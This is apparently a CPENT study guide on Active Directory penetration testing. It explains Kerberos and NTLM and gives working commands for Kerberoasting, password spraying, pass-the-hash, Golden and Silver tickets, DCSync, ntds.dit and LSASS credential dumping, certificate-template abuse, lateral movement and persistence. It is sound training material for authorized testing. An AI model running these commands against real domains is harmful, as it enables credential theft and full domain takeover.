# 07 - Active Directory Penetration Testing

**Author:** Zeeshan
**GitHub:** https://github.com/mzeeshanzafar28
**LinkedIn:** https://www.linkedin.com/in/mzeeshanzafar28

Active Directory is usually the highest-value target in CPENT. Full domain compromise (especially Domain Admin + DCSync) is worth significant points. AD attacks are consistently reported as one of the highest-weighted, highest-time-investment domains. **Read the concepts section fully before touching any tool** — half of AD exploitation is understanding what Kerberos and NTLM are actually doing under the hood; the commands are the easy part once that clicks.

> **Safety:** Use these techniques only against systems and identities you are explicitly authorized to test. The commands below are written primarily for isolated labs, CPENT ranges, CTFs, and authorized penetration tests.

---

## Table of Contents

1. [AD Architecture](#1-ad-architecture)
2. [Kerberos Authentication Deep-Dive](#2-kerberos-authentication-deep-dive)
3. [NTLM Authentication Explained](#3-ntlm-authentication-explained)
4. [Key Ports and Services](#4-key-ports-and-services)
5. [Trusts, Groups, Policies, and Certificates](#5-trusts-groups-policies-and-certificates)
6. [AD Reconnaissance & Enumeration](#6-ad-reconnaissance--enumeration)
7. [BloodHound Attack-Path Mapping](#7-bloodhound-attack-path-mapping)
8. [GPP / cPassword Attack](#8-gpp--cpassword-attack)
9. [Kerberoasting](#9-kerberoasting)
10. [AS-REP Roasting](#10-as-rep-roasting)
11. [Password Spraying](#11-password-spraying)
12. [Pass-the-Hash (PtH)](#12-pass-the-hash-pth)
13. [Pass-the-Ticket (PtT)](#13-pass-the-ticket-ptt)
14. [Golden Ticket](#14-golden-ticket)
15. [Silver Ticket](#15-silver-ticket)
16. [DCSync (Domain Dominance)](#16-dcsync-domain-dominance)
17. [Delegation Abuse](#17-delegation-abuse)
18. [ACL-Based Attacks](#18-acl-based-attacks)
19. [AD CS (Certificate Services)](#19-ad-cs-certificate-services)
20. [Exchange Enumeration & Exploitation](#20-exchange-enumeration--exploitation)
21. [Lateral Movement](#21-lateral-movement)
22. [ntds.dit Extraction](#22-ntdsdit-extraction)
23. [Credential Dumping (Mimikatz, LSASS)](#23-credential-dumping)
24. [Persistence Options](#24-persistence-options)
25. [Practical Exam Workflow](#25-practical-exam-workflow)
26. [Tool-to-Technique Map](#26-tool-to-technique-map)
27. [Practice](#27-practice)

---

## 1. AD Architecture

### Domain

A logical grouping of users, computers, and resources sharing a common directory database and security policy, managed by one or more Domain Controllers (DCs). A domain is an administrative and security boundary.

Examples:

```
corp.local
CORP\alice
alice@corp.local
```

The FQDN and NetBIOS name are related but not necessarily identical.

### Tree

A collection of one or more domains that share a contiguous DNS namespace:

```
corp.example.com
 |
 +-- europe.corp.example.com
 |
 +-- asia.corp.example.com
```

Child domains are part of the same DNS namespace.

### Forest

The top-level container — a collection of one or more trees that share a common schema, configuration, and Global Catalog, but not necessarily a contiguous namespace. **The forest is the actual security boundary in AD, not the domain.** This matters when scoping cross-domain attacks.

```
Forest
 |
 +-- Tree A
 |    |
 |    +-- Domain A
 |    +-- Child Domain A
 |
 +-- Tree B
      |
      +-- Domain B
      +-- Child Domain B
```

### Domain Controller (DC)

The server(s) hosting Active Directory Domain Services (AD DS). A DC:

- Authenticates logons
- Enforces security policy
- Stores the directory database (`ntds.dit`)
- Hosts the Kerberos KDC
- Handles Group Policy distribution
- Provides DNS integration and Global Catalog services
- Manages replication with other DCs

**Compromising a DC is effectively "game over" for that domain.**

Important paths on a DC:

- `C:\Windows\NTDS\ntds.dit` — the AD database
- SYSVOL and Group Policy folders
- `%SystemRoot%\NTDS\` — AD logs and working files

### Organizational Units (OUs)

Containers used to organize directory objects and apply Group Policy:

```
corp.local
 |
 +-- OU=Servers
 +-- OU=Workstations
 +-- OU=Users
 +-- OU=Admins
```

OUs matter because they reveal organizational structure, administrative boundaries, policy application, server roles, and potential privileged users.

### AD Objects

Common objects: Users, Groups, Computers, OUs, Domain Controllers, GPOs, Service Accounts, Contacts, Managed Service Accounts, Certificate-related objects.

Key user attributes:

```
sAMAccountName      userPrincipalName       memberOf
servicePrincipalName    description         mail
pwdLastSet          userAccountControl       objectSid
```

---

## 2. Kerberos Authentication Deep-Dive

Kerberos is AD's default authentication protocol (port **88**, TCP/UDP). Understanding its ticket flow is **the single most important concept** for the AD module, because nearly every advanced AD attack abuses one step in this flow.

### Core Components

| Component | Description |
|---|---|
| **KDC (Key Distribution Center)** | Service running on every DC, split into AS and TGS |
| **AS (Authentication Service)** | Verifies user's initial login; issues TGT |
| **TGS (Ticket Granting Service)** | Issues service tickets using TGT as proof |
| **TGT (Ticket Granting Ticket)** | Proof user authenticated to AS; encrypted with `krbtgt` hash |
| **Service Ticket (TGS)** | Ticket for a *specific* service; encrypted with that service account's hash |
| **krbtgt** | Built-in domain account whose password hash signs/encrypts every TGT |
| **SPN (Service Principal Name)** | Associates a service instance with an account (e.g., `MSSQLSvc/sql01.corp.local:1433`) |
| **PAC (Privilege Attribute Certificate)** | Embedded inside ticket; contains group memberships and privileges |

### Normal Authentication Flow

```
1. User authenticates to AS
   → AS issues TGT (encrypted with krbtgt hash)

2. User presents TGT to TGS, requesting access to specific service (SPN)
   → TGS issues Service Ticket (encrypted with that service account's hash)

3. User presents Service Ticket to target service
   → Service decrypts it using its own password hash to validate
   → NOTE: Target service never talks to DC during this step!
```

### Attack Surface Mapping

Every major Kerberos attack targets one of these encryption points:

| Attack | Target | What It Abuses |
|---|---|---|
| **Kerberoasting** | Service Ticket (TGS-REP) | Any user can request; crack service account hash offline |
| **AS-REP Roasting** | AS-REP | Accounts without pre-authentication; crack offline |
| **Golden Ticket** | TGT (krbtgt hash) | Forge unlimited TGTs for any user |
| **Silver Ticket** | Service Ticket (service hash) | Forge tickets for specific services |
| **Pass-the-Ticket** | Any ticket in memory | Steal and reuse legitimately issued tickets |
| **DCSync** | Replication protocol | Impersonate DC to request password data |

---

## 3. NTLM Authentication Explained

NTLM is the legacy challenge-response authentication protocol, still present in every AD environment for backward compatibility. Used automatically when Kerberos isn't available (authenticating by IP instead of hostname, workgroup machines, legacy applications).

### NTLMv2 Challenge-Response Flow

```
1. Client requests authentication → sends username
2. Server sends back a random challenge
3. Client encrypts challenge using NTLM hash (derived from password) → sends response
4. Server (or DC via Netlogon) verifies response using its own copy of the hash
```

The actual password is **never transmitted** — only a hash-derived response. Capturing that response (e.g., via Responder) gives you a crackable or relayable NetNTLMv2 hash.

### Why NTLM Matters to Attackers

| Attack Surface | Description |
|---|---|
| **Password Spraying** | Try common passwords against many users |
| **NTLM Relay** | Relay captured NetNTLMv2 to other services |
| **Pass-the-Hash** | Use NTLM hash directly as credential |
| **Hash Extraction** | Dump hashes from SAM/SYSTEM/LSASS/NTDS |
| **Offline Cracking** | Crack captured NetNTLMv2 or raw NTLM hashes |
| **LLMNR/NBT-NS Poisoning** | Capture hashes from broadcast name-resolution |

---

## 4. Key Ports and Services

| Port | Service | AD Relevance |
|---|---|---|
| 53/TCP+UDP | DNS | Name resolution and DC discovery; AD DNS SRV records |
| 88/TCP+UDP | Kerberos | Primary authentication protocol |
| 123/UDP | NTP | Time synchronization (Kerberos requires time sync) |
| 135/TCP | MSRPC | RPC Endpoint Mapper; DC communication |
| 137/UDP | NetBIOS-NS | Legacy name service |
| 138/UDP | NetBIOS-DGM | Legacy datagram service |
| 139/TCP | NetBIOS-SSN | SMB over NetBIOS (file/IPC sharing) |
| 389/TCP+UDP | LDAP | Directory access and queries |
| 445/TCP | SMB | File sharing, IPC, lateral movement, SYSVOL replication |
| 464/TCP+UDP | Kerberos Password Change | Password change operations |
| 636/TCP | LDAPS | LDAP over TLS (secure directory queries) |
| 3268/TCP | Global Catalog | Forest-wide directory search |
| 3269/TCP | Global Catalog over TLS | Secure forest-wide search |
| 3389/TCP+UDP | RDP | Remote Desktop (often used for admin access) |
| 5985/TCP | WinRM HTTP | PowerShell Remoting |
| 5986/TCP | WinRM HTTPS | Secure PowerShell Remoting |

Additional ports may appear: RPC dynamic ports, certificate services, Exchange (25, 80, 443, 587), SQL Server (1433), IIS, and other enterprise applications.

**Never identify a service from the port number alone.** Confirm it with enumeration.

---

## 5. Trusts, Groups, Policies, and Certificates

### Trust Relationships

Trusts allow users in one domain/forest to authenticate to resources in another.

| Trust Type | Description |
|---|---|
| **One-Way** | Domain A trusts Domain B → users in B can access A, but not reverse |
| **Two-Way (Bidirectional)** | Both domains trust each other (default within a forest) |
| **Parent-Child** | Automatic two-way transitive trust between parent and child domains |
| **Tree-Root** | Automatic two-way transitive trust between forest root and tree roots |
| **External** | Non-transitive trust to a domain outside the forest |
| **Realm** | Trust to a non-Windows Kerberos realm |

The direction of trust matters. "Domain A trusts Domain B" does NOT mean "Domain B trusts Domain A."

Enumerate: trust direction, type, transitivity, SID filtering, privileged groups, cross-domain access.

### Groups Hierarchy (Power Climb)

| Group | Scope |
|---|---|
| **Local Administrators** | Single machine |
| **Domain Admins** | Full power across the domain |
| **Enterprise Admins** | Forest-wide, lives in forest root domain |

Do not assume only `Domain Admins` matters. Lower groups may have:
- Write permissions over other objects
- Service administration rights
- Local admin on specific machines
- Replication privileges (DCSync)
- Certificate enrollment rights
- Delegated control over an OU

### Group Policy Objects (GPOs)

Centrally pushed configuration/security settings. From a pentesting perspective, inspect whether GPOs expose:

- Credentials (GPP `cpassword`)
- Weak security settings
- Dangerous scripts run as SYSTEM
- Excessive permissions
- Legacy protocols enabled
- Misconfigured local administrator accounts

### AD Certificate Services (AD CS)

Provides certificate-based identity infrastructure. Can support user/computer authentication, smart cards, TLS, code signing. Where deployed, misconfigured certificate templates are a high-value AD attack surface (ESC attack chains).

### ntds.dit

Located at `C:\Windows\NTDS\ntds.dit` on a Domain Controller. The actual AD database file containing every object in the domain including password hashes. Extracting and cracking this is the ultimate goal of many DC-compromise chains.

---

## 6. AD Reconnaissance & Enumeration

Start unauthenticated/low-privileged; escalate depth as you gain credentials.

### From Linux (through proxychains if pivoted)

```bash
# Basic SMB fingerprinting (works even without creds)
crackmapexec smb <dc-ip>

# Check for null-session share access
crackmapexec smb <dc-ip> -u '' -p '' --shares

# With credentials: enumerate users, groups, password policy, shares
netexec smb 172.16.20.5 -u 'user' -p 'Password123' --users --groups --pass-pol --shares

# List shares anonymously
smbclient -L //<dc-ip>/ -N

# Connect to a share
smbclient //<dc-ip>/ShareName -U 'CORP\user'
# Inside SMB: dir, recurse ON, prompt OFF, mget *, exit

# LDAP enumeration with credentials
ldapsearch -x -H ldap://<dc-ip> -D "<domain>\<user>" -w '<password>' -b "dc=domain,dc=com"

# LDAP RootDSE (discover naming contexts)
ldapsearch -x -H ldap://<dc-ip> -s base -b "" "(objectClass=*)" defaultNamingContext rootDomainNamingContext dnsHostName

# LDAP domain dump (comprehensive)
ldapdomaindump -u 'domain\user' -p 'Password123' <dc-ip>
# Output: domain_users.grep, domain_groups.grep, domain_computers.grep

# Impacket enumeration
impacket-GetADUsers -all domain.local/user:Password123 -dc-ip <dc-ip>
impacket-findDelegation domain.local/user:Password123 -dc-ip <dc-ip>

# DNS-based DC discovery
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
nslookup -type=SRV _kerberos._tcp.corp.local

# Nmap AD-specific scan
nmap -Pn -sV -p53,88,135,139,389,445,464,636,3268,3269 <dc-ip>
nmap -Pn -p445 --script smb-protocols,smb2-security-mode,smb-os-discovery <dc-ip>
nmap -Pn -p389,636 --script ldap-rootdse <dc-ip>
```

### From Windows (once you have a shell)

```cmd
whoami /all
hostname
systeminfo
echo %USERDOMAIN%
echo %LOGONSERVER%

# Domain membership
systeminfo | findstr /B /C:"Domain"

# Find DC
nltest /dsgetdc:corp.local
nltest /dclist:corp.local

# Users and groups
net user /domain
net group "Domain Admins" /domain
net group "Domain Users" /domain
net accounts /domain
```

### PowerShell AD Enumeration

```powershell
# Requires AD module
Get-ADDomainController -Filter *
Get-ADUser -Filter *
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"
Get-ADComputer -Filter * | Select-Object Name,DNSHostName,OperatingSystem
Get-ADObject -LDAPFilter '(objectClass=pKIEnrollmentService)'
```

### Manual PowerShell Recon (No AD Module Needed)

```powershell
# PowerView (load first)
. .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroup "Domain Admins"
Get-NetComputer
Find-LocalAdminAccess
Get-NetGPO
Get-DomainTrust
Get-NetSession
Get-NetLoggedon
```

### RPC Enumeration

```bash
# Test anonymous RPC
rpcclient -U "" -N <dc-ip>
# If successful:
#   srvinfo, enumdomusers, enumdomgroups, querydominfo, netshareenum, exit
```

### SPN Enumeration

```cmd
# Windows
setspn -Q */*
setspn -T corp.local -Q */*
setspn -L USERNAME
```

```bash
# Linux (Impacket)
impacket-GetUserSPNs 'CORP.LOCAL/user:password' -dc-ip <dc-ip>
```

---

## 7. BloodHound Attack-Path Mapping

BloodHound turns raw AD enumeration data into a graph of who can reach what — essential for finding the shortest route from your current low-privilege foothold to Domain Admin.

### Collection

**SharpHound (from Windows):**

```cmd
SharpHound.exe -c All
# Or: SharpHound.exe --collectionmethods All
```

Collection methods: Default, All, Session, ACL, Group, Trust, ObjectProps, Container, GPOLocalGroup, LoggedOn, DCOM, RDP.

**bloodhound-python (from Linux):**

```bash
bloodhound-python -u user -p 'Password123' -d domain.local -c all -ns <dc-ip> --zip
```

### Analysis

1. Import the resulting `.zip` into BloodHound GUI (backed by Neo4j database).
2. Use built-in queries:
   - "Shortest Path to Domain Admins"
   - "Find Kerberoastable Users"
   - "Find AS-REP Roastable Users"
   - "Find Computers where Domain Users are Local Admin"
   - "Find Principals with DCSync Rights"
   - "Shortest Paths to High Value Targets"
3. Translate graph edges into actual attack commands.

### High-Value BloodHound Edges

- **Kerberoastable** → Kerberoasting
- **ASREPRoastable** → AS-REP Roasting
- **Unconstrained Delegation** → Coerce authentication + ticket capture
- **Constrained Delegation** → `msDS-AllowedToDelegateTo` abuse
- **RBCD** → `msDS-AllowedToActOnBehalfOfOtherIdentity`
- **LocalAdmin** → Lateral movement to that host
- **HasSession** → Credential dumping on that host
- **GenericAll / GenericWrite / WriteDACL / WriteOwner** → ACL abuse
- **ForceChangePassword** → Targeted password reset
- **AddMember** → Add self to privileged group
- **DCSync rights** → Directly DCSync

---

## 8. GPP / cPassword Attack

Older Group Policy Preferences (GPP) deployed `Groups.xml` files (found under SYSVOL) sometimes contain a `cpassword` attribute — a **reversibly** AES-encrypted password. Microsoft published the fixed key years ago, so it's fully decryptable.

### Workflow

**1. Access SYSVOL share:**

```bash
smbclient //<dc-ip>/SYSVOL -N
# Inside SMB:
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
smb: \> exit
```

**2. Search for Groups.xml:**

```bash
find . -name "Groups.xml" -type f
```

**3. Extract cpassword from XML:**

```xml
<Properties>
  <cpassword>j1Uyj3Vx8TY9LtLZil2uAu2t8FejRtzOgqkJt...</cpassword>
  <userName>Administrator</userName>
</Properties>
```

**4. Decrypt:**

```bash
gpp-decrypt <cpassword-value-here>
```

If you find one of these, you likely just got a valid domain credential for free.

---

## 9. Kerberoasting

Any domain user can request a service ticket (TGS) for any account with a registered SPN. That ticket is encrypted with the service account's own password hash — meaning you can request it and crack it offline without touching the target service at all.

### Why It Works

The service ticket contains material encrypted using a key derived from the service account's secret. An attacker can request the ticket and perform offline password guessing without repeatedly authenticating against the DC. MITRE classifies this as T1558.003.

### Execution

```bash
# Request TGS tickets (no -request flag = enumerate SPNs only)
impacket-GetUserSPNs domain.local/user:Password123 -dc-ip <dc-ip> -request

# Save to file
impacket-GetUserSPNs domain.local/user:Password123 -dc-ip <dc-ip> -request -outputfile tgs.hash
```

### Cracking

```bash
# Hashcat (mode 13100 for Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt

# John
john --format=krb5tgs tgs.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Output format: `$krb5tgs$23$*user$DOMAIN.LOCAL$...:cracked-password`

### Post-Exploitation

Do not assume a cracked password means domain compromise. Ask:
- Which account was recovered?
- Is it privileged? (memberOf, adminCount)
- Where can it authenticate?
- Is the password reused?
- What SPNs does it control?
- What groups does it belong to?

Service accounts are frequently configured with old, weak, never-rotated passwords, making Kerberoasting one of the highest-success-rate AD attacks.

---

## 10. AS-REP Roasting

Targets accounts with Kerberos pre-authentication disabled ("Do not require Kerberos preauthentication"). You can request an AS-REP for that user **without knowing their password at all**, and the response comes back encrypted with their password hash — crackable offline.

### Find Vulnerable Users

```bash
# Using Impacket
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip>

# With valid credentials to enumerate
impacket-GetNPUsers domain.local/user:Password123 -dc-ip <dc-ip> -request
```

### Cracking

```bash
# Hashcat mode 18200 (Kerberos 5 AS-REP etype 23)
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## 11. Password Spraying

Attempt a small number of likely passwords against many accounts (opposite of brute force — one password, many users). This reduces lockout risk but can still trigger alerts.

### Before Spraying — Check Policy

```cmd
net accounts /domain
```

Look for: lockout threshold, lockout duration, minimum password length, password history.

### Spraying with NetExec

```bash
# Single password against user list
nxc smb <dc-ip> -u users.txt -p 'Summer2024!' --continue-on-success

# Password list (small!) against single user
nxc smb <dc-ip> -u 'user' -p passwords.txt
```

**Safety:** Use a very small number of candidate passwords. If lockout threshold is 3, spray 1-2 passwords max per cycle.

---

## 12. Pass-the-Hash (PtH)

Once you have an NTLM hash (from `secretsdump`, Mimikatz, LLMNR poisoning + cracking), you can authenticate to many services **using the hash directly** — no need to crack it to plaintext first.

```bash
# PtH with crackmapexec/netexec
nxc smb <target> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<ntlm-hash>

# PtH with Impacket (various shells)
impacket-psexec domain.local/Administrator@<target> -hashes :<ntlm-hash>
impacket-wmiexec domain.local/Administrator@<target> -hashes :<ntlm-hash>
impacket-smbexec domain.local/Administrator@<target> -hashes :<ntlm-hash>

# PtH with Evil-WinRM
evil-winrm -i <target> -u Administrator -H <ntlm-hash>
```

The `:LMHASH:NTLMHASH` format passes the LM hash as empty (`:` or `aad3b...` = blank LM hash). The critical requirement is that the target authentication protocol and service accept the credential material.

---

## 13. Pass-the-Ticket (PtT)

Rather than forging a ticket from scratch, you steal (export) a legitimately issued ticket from memory on a compromised host and reuse it elsewhere.

### With Rubeus (Windows)

```cmd
# Enumerate current tickets
Rubeus.exe triage

# Dump all tickets from memory
Rubeus.exe dump

# Extract TGTs
Rubeus.exe dump /service:krbtgt

# Inject a stolen/forged ticket into current session
Rubeus.exe ptt /ticket:<base64-ticket>

# Confirm the ticket is loaded
klist
```

### With Mimikatz (Windows)

```
privilege::debug
sekurlsa::tickets /export
kerberos::ptt <ticket-file>
```

### With Impacket (Linux)

```bash
# Convert .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# Export and use
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.local/user@<target> -k -no-pass
```

---

## 14. Golden Ticket

With the krbtgt account's NTLM hash (typically obtained via `secretsdump` or Mimikatz `lsadump::dcsync` against a DC you've already compromised), you can forge a completely valid TGT for **any** user — including nonexistent ones — with any group memberships you choose. This is effectively unlimited, persistent domain access that survives normal password resets.

> Only a krbtgt password reset, done **twice**, invalidates Golden Tickets.

### Required Information

- krbtgt NTLM hash
- Domain SID
- Domain FQDN

### With Rubeus (Windows)

```cmd
Rubeus.exe golden /rc4:<krbtgt-ntlm-hash> /domain:domain.local /sid:<domain-sid> /user:Administrator /ptt
```

### With Impacket (Linux)

```bash
# Obtain krbtgt hash first (via DCSync)
impacket-secretsdump domain.local/Administrator@<dc-ip> -just-dc-user krbtgt

# Forge Golden Ticket
impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <DomainSID> -domain domain.local Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@<dc-ip> -k -no-pass
```

---

## 15. Silver Ticket

Same forging concept as Golden Ticket, but scoped to a **single service**, using that *service account's* hash instead of krbtgt. Narrower blast radius but doesn't require compromising a DC first.

### With Impacket

```bash
# Forge Silver Ticket for CIFS (file share) service
impacket-ticketer -nthash <service-ntlm-hash> -domain-sid <DomainSID> -domain domain.local -spn cifs/<target-host> Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@<target-host> -k -no-pass
```

Common target SPNs: `cifs/<host>`, `host/<host>`, `HTTP/<host>`, `MSSQLSvc/<host>`.

---

## 16. DCSync (Domain Dominance)

Abuses the Directory Replication Service to impersonate a Domain Controller and request password data (including krbtgt and any other account's hash) directly from another DC, without ever touching `ntds.dit` on disk.

### Required Rights

- `DS-Replication-Get-Changes` (GUID: 1131f6aa-…)
- `DS-Replication-Get-Changes-All` (GUID: 1131f6ad-…)

Normally held by: Domain Admins, Enterprise Admins, Domain Controllers. Sometimes misdelegated — check BloodHound for "DCSync" edge.

### Execution

```bash
# Dump all domain hashes via replication
impacket-secretsdump domain.local/Administrator@<dc-ip> -just-dc

# Target specific user
impacket-secretsdump domain.local/Administrator@<dc-ip> -just-dc-user krbtgt

# With hash instead of password
impacket-secretsdump domain.local/Administrator@<dc-ip> -hashes :<ntlm-hash> -just-dc
```

Output includes: NTLM hashes, LM hashes, Kerberos keys, cleartext passwords (if stored with reversible encryption), and computer account hashes.

---

## 17. Delegation Abuse

Kerberos delegation allows services to act on behalf of users in defined circumstances. Misconfiguration creates paths to privileged accounts.

### Unconstrained Delegation

A host configured for unconstrained delegation can receive forwarded Kerberos credentials. Compromise such a host, then coerce a Domain Admin to authenticate to it (via PrinterBug, PetitPotam) — their TGT lands in memory on your host.

```bash
# Find unconstrained delegation hosts (BloodHound or Impacket)
impacket-findDelegation domain.local/user:Password123 -dc-ip <dc-ip>
# Look for: "TRUSTED_FOR_DELEGATION" without "constrained"
```

### Constrained Delegation

Restricted to specified SPNs via `msDS-AllowedToDelegateTo`. If a service account can delegate to a privileged service, request a forwarded ticket.

### Resource-Based Constrained Delegation (RBCD)

Attribute: `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write to this attribute on a computer object, you can configure RBCD and obtain a service ticket for that computer.

```bash
# Using Impacket
impacket-getST -spn cifs/<target> -impersonate Administrator domain.local/attacker:Password123

# Using certipy for AD CS + RBCD chains
certipy auth -pfx <cert.pfx> -dc-ip <dc-ip>
```

---

## 18. ACL-Based Attacks

Access Control Lists define permissions over AD objects. Dangerous ACL rights:

| Right | Potential Abuse |
|---|---|
| **GenericAll** | Full control — change password, add to group, modify attributes |
| **GenericWrite** | Write to attributes — modify SPN, delegation settings |
| **WriteDACL** | Modify object's ACL — grant yourself more rights |
| **WriteOwner** | Take ownership → modify DACL → grant rights |
| **AddMember** | Add yourself to a privileged group |
| **ForceChangePassword** | Change target user's password |
| **AddSelf** | Add self to a group (via self-membership attribute) |

BloodHound automatically identifies these relationships. The attack chain follows:

```
Principal → Permission → Target Object → Exploit → Privilege Escalation
```

---

## 19. AD CS (Certificate Services)

Active Directory Certificate Services provides certificate-based identity infrastructure. Misconfigured certificate templates are high-value escalation paths (ESC1-ESC13).

### Enumeration

```bash
# certipy — find vulnerable templates
certipy find -u 'user@corp.local' -p 'password' -dc-ip <dc-ip> -vulnerable

# On Windows
certutil -config - -ping
```

### Common ESC Attack Classes

- **ESC1:** Template allows enrollee-supplied SAN → request cert as any user (including DA)
- **ESC2:** Template can be used for any purpose (includes client authentication)
- **ESC3:** Enrollment agent template can request on behalf of others
- **ESC4:** Users have write privileges over template configuration
- **ESC6:** CA enables `EDITF_ATTRIBUTESUBJECTALTNAME2` flag
- **ESC8:** NTLM relay to AD CS web enrollment endpoint

### Exploit Example (ESC1)

```bash
# Request certificate as Domain Admin
certipy req -u 'user@corp.local' -p 'password' -ca 'CA-NAME' -target <ca-server> \
  -template 'VulnerableTemplate' -upn '[email protected]'

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

---

## 20. Exchange Enumeration & Exploitation

Exchange Server may expose additional attack surface. CPENT explicitly includes Exchange enumeration and exploitation.

### Enumeration

```bash
# Port scan
nmap -Pn -sV -p25,80,443,587 <exchange-ip>

# HTTP fingerprinting
curl -I https://exchange.corp.local/

# Look for: Autodiscover, OWA, EWS, ActiveSync, SMTP behavior
```

### User Enumeration

Potential information sources: Autodiscover, OWA timing attacks, EWS, SMTP VRFY/EXPN, error messages, LDAP-backed directory info.

### Exploitation Workflow

```
Identify Exchange version
  → Identify exposed endpoints
    → Research vendor advisories/CVEs (ProxyShell, ProxyNotShell, ProxyLogon)
      → Check exact prerequisites
        → Controlled validation
          → Document impact
```

Do not use a historical Exchange exploit simply because port 443 is open.

---

## 21. Lateral Movement

Once you hold valid credentials (password or hash) for a high-privileged or target user, execute code on other machines.

### psexec (SMB-Based, SYSTEM Shell)

Drops a service binary via ADMIN$ share, starts it, gets SYSTEM shell:

```bash
impacket-psexec domain.local/Administrator:Password123@<target>
impacket-psexec domain.local/Administrator@<target> -hashes :<ntlm-hash>
```

Requirements: SMB access, admin shares, service creation permissions, appropriate admin privileges.

### wmiexec (WMI-Based, Quieter)

Uses Windows Management Instrumentation — no service binary dropped:

```bash
impacket-wmiexec domain.local/Administrator:Password123@<target>
impacket-wmiexec domain.local/Administrator@<target> -hashes :<ntlm-hash>
```

Useful when SMB service creation is blocked but WMI permissions exist.

### smbexec (SMB-Based, Semi-Interactive)

```bash
impacket-smbexec domain.local/Administrator:Password123@<target>
impacket-smbexec domain.local/Administrator@<target> -hashes :<ntlm-hash>
```

### evil-winrm (WinRM Shell, Most Stable)

If ports 5985/5986 are open:

```bash
evil-winrm -i <target> -u Administrator -p 'Password123'
evil-winrm -i <target> -u Administrator -H <ntlm-hash>
```

WinRM access is particularly valuable because it provides a native PowerShell environment.

### RDP (Interactive Desktop)

```bash
xfreerdp /v:<target> /u:Administrator /p:'Password123'
```

RDP access is valuable because it can expose: interactive sessions, browser credentials, cached secrets, user files, administrative tools, and additional network visibility.

### crackmapexec / netexec (Validate Access First)

```bash
# Test credentials before moving laterally
nxc smb <target> -u Administrator -p 'Password123'

# Check admin status
nxc smb <target> -u Administrator -p 'Password123' -x 'whoami'

# Execute command via SMB
nxc smb <target> -u Administrator -p 'Password123' -X 'powershell -enc <base64>'
```

### LLMNR/NBT-NS Poisoning with Responder

Captures NetNTLMv2 hashes from broadcast name-resolution requests on the local segment:

```bash
sudo responder -I eth0
# Captured hashes logged automatically to /usr/share/responder/logs/

# Crack captured hashes
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 22. ntds.dit Extraction

The ultimate credential dump — every account's hash in the domain.

### Method 1: secretsdump (DCSync — Preferred)

Does not touch ntds.dit on disk; uses replication protocol. Requires replication rights:

```bash
impacket-secretsdump domain.local/Administrator@<dc-ip> -just-dc
```

### Method 2: Volume Shadow Copy (If You Have Local Admin on DC)

```cmd
# Create shadow copy
vssadmin create shadow /for=C:

# Copy ntds.dit from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Also copy SYSTEM hive (needed for decryption)
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Clean up
vssadmin delete shadows /for=C: /oldest
```

Then on attacker machine:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Method 3: ntdsutil (Windows Built-in)

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntdsdump" q q
```

---

## 23. Credential Dumping

### Mimikatz (Windows, Post-Elevation to SYSTEM)

```
privilege::debug
sekurlsa::logonpasswords    # Dump plaintext + hashes from LSASS
sekurlsa::tickets /export    # Export Kerberos tickets
lsadump::sam                 # Dump local SAM hashes
lsadump::secrets             # Dump LSA secrets
lsadump::dcsync /domain:domain.local /user:krbtgt   # DCSync
```

### LSASS Dump (Alternative to Mimikatz)

```cmd
# Create LSASS dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Extract hashes offline (on attacker machine)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
mimikatz # sekurlsa::minidump lsass.dmp ; sekurlsa::logonpasswords
```

### Cached Domain Credentials

Windows caches domain logon information for offline logon. Retrieve from:

- LSASS memory
- Credential Manager (`cmdkey /list` → `vaultcmd /listcreds:`)
- Registry (LSA secrets: `reg save HKLM\SECURITY`)
- Browser/application stores
- Configuration files: `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- Unattended installation files: `C:\Unattend.xml`, `C:\Windows\Panther\Unattend.xml`

---

## 24. Persistence Options

Document all persistence clearly. In the exam, persistence is useful but methodology and reaching DA/DC matter more.

| Technique | Tool | Difficulty | Detection Risk |
|---|---|---|---|
| **Golden Ticket** | Rubeus / ticketer.py | High (needs krbtgt) | Low-Med |
| **Silver Ticket** | Rubeus / ticketer.py | Med (needs service hash) | Low |
| **Skeleton Key** | Mimikatz (misc::skeleton) | High (needs DA on DC) | Med |
| **AdminSDHolder** | PowerView | Med (needs DA) | Low-Med |
| **New DA User** | net user / net group | Low (noisy) | High |
| **Scheduled Tasks on DC** | schtasks | Med | Med |
| **WMI Event Subscription** | PowerView | Med-High | Low-Med |
| **DSRM Account** | `reg add HKLM\...\Lsa /v DsrmAdminLogonBehavior` | High | Low |
| **Diamond Ticket** | Rubeus | High | Low |

---

## 25. Practical Exam Workflow

1. **Obtain any domain user credentials** — web app creds, GPP cpassword, Kerberoast, AS-REP, password spray, LLMNR poisoning.
2. **Run BloodHound collection** and analyze shortest paths to DA or high-value targets.
3. **Perform Kerberoasting and AS-REP Roasting immediately** — these are your highest-probability quick wins.
4. **Spray or crack** what you can from hashes.
5. **Move laterally** with PtH / tickets / WinRM / SMB to hosts where you have access.
6. **Escalate on individual hosts** if needed (see Privilege Escalation module).
